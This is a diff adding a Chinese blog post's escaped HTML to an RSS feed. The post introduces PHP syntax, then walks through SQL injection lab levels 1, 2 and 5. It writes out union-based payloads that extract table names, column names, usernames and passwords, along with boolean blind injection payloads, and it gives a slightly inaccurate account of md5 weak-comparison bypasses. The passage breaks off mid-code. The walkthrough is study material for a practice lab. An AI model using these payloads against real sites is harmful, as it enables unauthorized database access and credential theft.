@@ -13,7 +13,803 @@
         <pubDate>Fri, 27 Sep 2024 15:32:07 +0800</pubDate>
         
         <guid>https://baoanleo.github.io/p/task1/</guid>
-        <description></description>
+        <description>&lt;h1 id=&#34;一初识php&#34;&gt;一.初识php
+&lt;/h1&gt;&lt;h2 id=&#34;1php语法&#34;&gt;1.php语法
+&lt;/h2&gt;&lt;p&gt;php整个代码以&lt;?php开始，?&gt;结束，中间为脚本代码。&lt;/p&gt;
+&lt;p&gt;如“hello world”&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#34;hello world&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;作用为输出hello world&lt;/p&gt;
+&lt;h2 id=&#34;2php变量&#34;&gt;2.php变量
+&lt;/h2&gt;&lt;p&gt;一般在变量前加$，代表传输变量赋值，比如:&lt;/p&gt;
+&lt;p&gt;$id,就是一个变量在sql注入中url中会有参数传递，也正是因为有参数传递所以才有sql注入的出现，&lt;/p&gt;
+&lt;p&gt;比如url中会有/?id=1，id就是一个变量，而在php代码中，会写出“$id”,这个时候1就会传输给id变量。&lt;/p&gt;
+&lt;p&gt;php变量命名规则：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;以$开始，后面是变量名字&lt;/li&gt;
+&lt;li&gt;变量名必须是以字母或者下划线开始&lt;/li&gt;
+&lt;li&gt;变量只能包含字母，数字以及下划线&lt;/li&gt;
+&lt;li&gt;变量不能有空格&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;变量是区分大小写的&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;php当中也有变量作用域： local ，global，static ， parameter&lt;/p&gt;
+&lt;p&gt;global是全局变量，声明了可以在整个代码中使用，static是静态变量，它不会被删除，&lt;/p&gt;
+&lt;h2 id=&#34;3echoprint&#34;&gt;3.echo/print
+&lt;/h2&gt;&lt;p&gt;echo可以输出字符&lt;/p&gt;
+&lt;p&gt;比如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#34;hello world&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$id=1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo $id &amp;#39;&amp;#39;&amp;#39;输出变量id=1&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;echo和print的区别：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;echo可以输出一个或者多个字符串且没有返回值，print只能输出一个且返回值为1&lt;/li&gt;
+&lt;li&gt;echo输出速度快&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;4eof&#34;&gt;4.EOF
+&lt;/h2&gt;&lt;p&gt;是定义一个字符串的方法&lt;/p&gt;
+&lt;p&gt;&amp;laquo;&amp;lt;EOF开始 ，EOF结束，结束的标记必须顶格写不能有空格，且要有分号&lt;/p&gt;
+&lt;p&gt;比如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$name=&amp;#34;leo&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$id= &amp;lt;&amp;lt;&amp;lt;EOF
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;#34;lili&amp;#34;$name
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;#34;123&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EOF;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo $id;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;5php类型比较&#34;&gt;5.php类型比较
+&lt;/h2&gt;&lt;p&gt;弱类型比较 == ：只比较值，不比较类型。&lt;/p&gt;
+&lt;p&gt;强类型比较 ===：即比较值，也比较类型。&lt;/p&gt;
+&lt;p&gt;在web攻防中，会碰上缺陷函数绕过，这时就是通过== 和  ===进行绕过。如md5比较如果是弱类型比较它只会比较加密后的前两个字符是否相同：0e，&lt;/p&gt;
+&lt;p&gt;若是===那么就必须通过数组绕过，因为md5不接受加密数组。&lt;/p&gt;
+&lt;h2 id=&#34;6php常量&#34;&gt;6.php常量
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;name ：常量名字&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;value：常量的值&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;case_insensitive：若为TRUE,则常量大小写不敏感。&lt;/p&gt;
+&lt;p&gt;注意使用时，常量不能带$，否则会报错&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;7php字符串&#34;&gt;7.php字符串
+&lt;/h2&gt;&lt;p&gt;.可以把两个字符串链接在一起&lt;/p&gt;
+&lt;h2 id=&#34;8for-循环&#34;&gt;8.for 循环
+&lt;/h2&gt;&lt;p&gt;foreach用于遍历数组&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;foreach ($array as $value)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    要执行代码;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;二sql注入&#34;&gt;二.sql注入
+&lt;/h1&gt;&lt;p&gt;sql注入其实就是通过sql语句去执行数据库操作达到入侵的效果，主要看是否有参数传递，如果url没有参数传递，也可查看是否有账号登录这种post提交的方法，，查询方式包括会员注册，删除新闻，修改文章等等要与数据库进行交互的方式。&lt;/p&gt;
+&lt;h2 id=&#34;第一关&#34;&gt;第一关
+&lt;/h2&gt;&lt;p&gt;通过输入‘来判断变量值是否是字符型注入还是数字型注入，第一关为字符型注入，因为我们输入了’后出现报错，为了方便，在源代码中我用echo $sql；让sql语句输出，可以更好的观看。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E4%B8%AA.jpg&#34;
+	width=&#34;2053&#34;
+	height=&#34;1117&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E4%B8%AA_hu5649014817252073235.jpg 480w, https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E4%B8%AA_hu14441234819371218347.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;183&#34;
+		data-flex-basis=&#34;441px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;1.猜列数&lt;/p&gt;
+&lt;p&gt;使用语法order by 查看有几个回显位数，若是正确的位数则不会报错。- - +是屏蔽后面的limit 语句。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C.jpg&#34;
+	width=&#34;2054&#34;
+	height=&#34;1253&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C_hu5592515777284831677.jpg 480w, https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C_hu9744040273408216186.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;163&#34;
+		data-flex-basis=&#34;393px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;获得有3位显示位后可以采取&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=-1&amp;#39;union select 1,2,3--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;为什么采取id=-1呢，因为如果id=1而此时id=1会放到数据库中去查询，刚好id=1是有值的，这个时候我们输入的select 1,2,3就没法回显到屏幕上，当然也可以采取id=100，若此时数据库中没有id=100，这时候就会爆出显示位。&lt;/p&gt;
+&lt;p&gt;获得显示位后，就可以在显示位上运用函数或者sql语句进行信息搜集比如version()查看数据库版本，database()查看当前数据库。&lt;/p&gt;
+&lt;p&gt;2.爆表&lt;/p&gt;
+&lt;p&gt;通过mysql独有的information_schema库来得到该数据库的表&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=-1&amp;#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;security&amp;#39;--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这段代码是查询information_schema下的所有表，并且table_schema的值等于security，并且将这些表的名字通过group_concat函数联合起来&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%89.jpg&#34;
+	width=&#34;2052&#34;
+	height=&#34;1521&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%89_hu16932669044390809790.jpg 480w, https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%89_hu6120641468051180448.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;134&#34;
+		data-flex-basis=&#34;323px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;3.爆字段&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=-1&amp;#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39;--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;跟爆表差不多就是查询字段名&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E5%9B%9B.jpg&#34;
+	width=&#34;2052&#34;
+	height=&#34;1521&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E5%9B%9B_hu16598470441040145622.jpg 480w, https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E5%9B%9B_hu16713642939375806306.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;134&#34;
+		data-flex-basis=&#34;323px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;4.爆出用户名，密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=-1&amp;#39; union select 1,2,group_concat(username ,id , password) from users--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%94.jpg&#34;
+	width=&#34;2052&#34;
+	height=&#34;1521&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%94_hu631484310880449493.jpg 480w, https://baoanleo.github.io/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%94_hu623627177415701375.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;134&#34;
+		data-flex-basis=&#34;323px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;第二关&#34;&gt;第二关
+&lt;/h2&gt;&lt;p&gt;第二关是数字型，不用‘注入，其他手段跟第一关一模一样，如何判断是否为数字型，通过id=1’- - +发现会报错，而id=1- -+不会报错是正常显示，说明是数字型。&lt;/p&gt;
+&lt;h2 id=&#34;第五关&#34;&gt;第五关
+&lt;/h2&gt;&lt;p&gt;第五关无论我们输入什么都是显示you are in。。。，这个时候联合注入就没用了，我们可以用布尔盲注来注入。&lt;/p&gt;
+&lt;p&gt;这里来说明一下：&lt;/p&gt;
+&lt;p&gt;有数据库输出判断标准：基于布尔&lt;/p&gt;
+&lt;p&gt;有数据库报错处理判断标准：基于报错&lt;/p&gt;
+&lt;p&gt;都不需要：基于延时&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and length((select database()))&amp;gt;7--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;判断数据库名字长度是否大于9&lt;/p&gt;
+&lt;p&gt;若正确会显示you are in，错误则什么都不会显示。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and ascii(substr((select database()),1,1))=115--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这句代码是取数据库名字的第一个字的ascii码，若等于115则显示正确。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&amp;gt;13--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这段代码是相当于关卡一爆表的代码只不过是看所有表的长度是否大于了13。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&amp;gt;99--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过这段代码挨个字符猜测长度来把每个表给猜出来&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;users&amp;#39;))&amp;gt;20--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过这段代码查看所有字段的长度&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;users&amp;#39;),1,1))&amp;gt;99--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;判断每个字段的每个字符的ascii码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
